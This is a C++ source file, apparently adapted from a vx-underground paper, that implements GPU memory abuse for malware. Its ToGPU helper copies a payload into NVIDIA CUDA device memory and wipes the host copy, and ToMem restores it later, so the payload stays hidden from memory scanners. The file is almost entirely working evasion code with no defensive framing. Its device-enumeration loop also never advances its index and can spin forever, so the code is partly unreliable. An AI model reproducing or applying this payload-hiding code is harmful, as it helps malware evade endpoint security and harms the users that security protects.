// the whole thing is from : https://github.com/vxunderground/VXUG-Papers/blob/main/GpuMemoryAbuse.cpp mwa mwa @vxunderground

#pragma once
#include <Windows.h>
#include "Common.h"
#pragma warning(disable:6011)


#define CUDACALL __stdcall
#define CUDA_SUCCESS 0

typedef struct PCUDE_CONTEXT* CUDA_CONTEXT;
typedef INT(CUDACALL* CUDAMEMORYALLOCATE)(ULONG_PTR, SIZE_T);
typedef INT(CUDACALL* CUDAINIT)(INT);
typedef INT(CUDACALL* CUDAGETDEVICECOUNT)(PINT);
typedef INT(CUDACALL* CUDAGETDEVICE)(PINT, INT);
typedef INT(CUDACALL* CUDACREATECONTEXT)(CUDA_CONTEXT*, DWORD, INT);
typedef INT(CUDACALL* CUDADESTROYCONTEXT)(CUDA_CONTEXT*);
typedef INT(CUDACALL* CUDAMEMORYCOPYTODEVICE)(ULONG_PTR, PVOID, SIZE_T);
typedef INT(CUDACALL* CUDAMEMORYCOPYTOHOST)(PVOID, ULONG_PTR, SIZE_T);
typedef INT(CUDACALL* CUDAMEMORYFREE)(ULONG_PTR);
CUDA_CONTEXT Context = NULL;


typedef struct _NVIDIA_API_TABLE {
	HMODULE NvidiaLibary;
	CUDAMEMORYALLOCATE CudaMemoryAllocate;
	CUDAINIT CudaInit;
	CUDAGETDEVICECOUNT CudaGetDeviceCount;
	CUDAGETDEVICE CudaGetDevice;
	CUDACREATECONTEXT CudaCreateContext;
	CUDAMEMORYCOPYTODEVICE CudaMemoryCopyToDevice;
	CUDAMEMORYCOPYTOHOST CudaMemoryCopyToHost;
	CUDAMEMORYFREE CudaMemoryFree;
	CUDADESTROYCONTEXT CudaDestroyContext;
} NVIDIA_API_TABLE, * PNVIDIA_API_TABLE;


NVIDIA_API_TABLE Api = { 0 };


SIZE_T StringLengthW(LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

PWCHAR StringLocateCharW(PWCHAR String, INT Character)
{
	do
	{
		if (*String == Character)
			return (PWCHAR)String;

	} while (*String++);

	return NULL;
}

INT StringCompareStringRegionW(PWCHAR String1, PWCHAR String2, SIZE_T Count)
{
	UCHAR Block1, Block2;
	while (Count-- > 0)
	{
		Block1 = (UCHAR)*String1++;
		Block2 = (UCHAR)*String2++;

		if (Block1 != Block2)
			return Block1 - Block2;

		if (Block1 == '\0')
			return 0;
	}

	return 0;
}

PWCHAR StringFindSubstringW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR pPointer = String1;
	DWORD Length = (DWORD)StringLengthW(String2);

	for (; (pPointer = StringLocateCharW(pPointer, *String2)) != 0; pPointer++)
	{
		if (StringCompareStringRegionW(pPointer, String2, Length) == 0)
			return (PWCHAR)pPointer;
	}

	return NULL;
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
	StringCopyW(&String[StringLengthW(String)], String2);

	return String;
}

BOOL IsNvidiaGraphicsCardPresent()
{
	DISPLAY_DEVICEW DisplayDevice; RtlZeroMemory(&DisplayDevice, sizeof(DISPLAY_DEVICEW));
	DisplayDevice.cb = sizeof(DISPLAY_DEVICEW);

	DWORD dwDeviceId = ERROR_SUCCESS;

	while (EnumDisplayDevicesW(NULL, dwDeviceId, &DisplayDevice, 0))
	{
		if (StringFindSubstringW(DisplayDevice.DeviceString, (PWCHAR)L"NVIDIA") != NULL)
			return TRUE;
	}

	return FALSE;
}

BOOL InitNvidiaCudaAPITable(PNVIDIA_API_TABLE Api)
{
	Api->NvidiaLibary = LoadLibraryW(L"nvcuda.dll");
	if (Api->NvidiaLibary == NULL)
		return FALSE;

	Api->CudaCreateContext = (CUDACREATECONTEXT)GetProcAddress(Api->NvidiaLibary, "cuCtxCreate_v2");
	Api->CudaGetDevice = (CUDAGETDEVICE)GetProcAddress(Api->NvidiaLibary, "cuDeviceGet");
	Api->CudaGetDeviceCount = (CUDAGETDEVICECOUNT)GetProcAddress(Api->NvidiaLibary, "cuDeviceGetCount");
	Api->CudaInit = (CUDAINIT)GetProcAddress(Api->NvidiaLibary, "cuInit");
	Api->CudaMemoryAllocate = (CUDAMEMORYALLOCATE)GetProcAddress(Api->NvidiaLibary, "cuMemAlloc_v2");
	Api->CudaMemoryCopyToDevice = (CUDAMEMORYCOPYTODEVICE)GetProcAddress(Api->NvidiaLibary, "cuMemcpyHtoD_v2");
	Api->CudaMemoryCopyToHost = (CUDAMEMORYCOPYTOHOST)GetProcAddress(Api->NvidiaLibary, "cuMemcpyDtoH_v2");
	Api->CudaMemoryFree = (CUDAMEMORYFREE)GetProcAddress(Api->NvidiaLibary, "cuMemFree_v2");
	Api->CudaDestroyContext = (CUDADESTROYCONTEXT)GetProcAddress(Api->NvidiaLibary, "cuCtxDestroy");

	if (!Api->CudaCreateContext || !Api->CudaGetDevice || !Api->CudaGetDeviceCount || !Api->CudaInit || !Api->CudaDestroyContext)
		return FALSE;

	if (!Api->CudaMemoryAllocate || !Api->CudaMemoryCopyToDevice || !Api->CudaMemoryCopyToHost || !Api->CudaMemoryFree)
		return FALSE;

	return TRUE;
}

BOOL InitAPITable2() {

	INT DeviceCount = 0;
	INT Device = 0;

	if (Api.CudaInit(0) != CUDA_SUCCESS)
		return FALSE;

	if (Api.CudaGetDeviceCount(&DeviceCount) != CUDA_SUCCESS || DeviceCount == 0)
		return FALSE;

	if (Api.CudaGetDevice(&Device, DeviceCount - 1) != CUDA_SUCCESS)
		return FALSE;

	if (Api.CudaCreateContext(&Context, 0, Device) != CUDA_SUCCESS)
		return FALSE;

	return TRUE;
}

// mem to gpu helper
ULONG_PTR RtlAllocateGpuMemory(PNVIDIA_API_TABLE Api, DWORD ByteSize)
{
	ULONG_PTR GpuBufferPointer = NULL;

	if (ByteSize == 0)
		return NULL;

	if (Api->CudaMemoryAllocate((ULONG_PTR)&GpuBufferPointer, ByteSize) != CUDA_SUCCESS)
		return NULL;

	return GpuBufferPointer;

}

// move to gpu memory and clean the payload
ULONG_PTR ToGPU(PVOID Address, SIZE_T Size, PNVIDIA_API_TABLE Api) {
	ULONG_PTR storageGPU = NULL;
	if ((storageGPU = RtlAllocateGpuMemory(Api, (DWORD)Size)) == NULL) {
		printf("[!] RtlAllocateGpuMemory failed ... \n");
		return NULL;
	}
	Api->CudaMemoryCopyToDevice(storageGPU, (PVOID)Address, Size);
	printf("[i] Moved [ MEM 0x%p ] to [ GPU: 0x%p ] \n", (PVOID)Address, (PVOID)storageGPU);

	ZeroMemory(Address, Size);
	return storageGPU;
}


// move to the memory, and free the gpu memory
VOID ToMem(PVOID Address, SIZE_T Size, ULONG_PTR storageGPU, PNVIDIA_API_TABLE Api) {
	Api->CudaMemoryCopyToHost((PVOID)Address, storageGPU, Size);
	Api->CudaMemoryFree(storageGPU);
	printf("[i] Moved [ GPU 0x%p ] to [ MEM: 0x%p ] \n", (PVOID)storageGPU, (PVOID)Address);
}
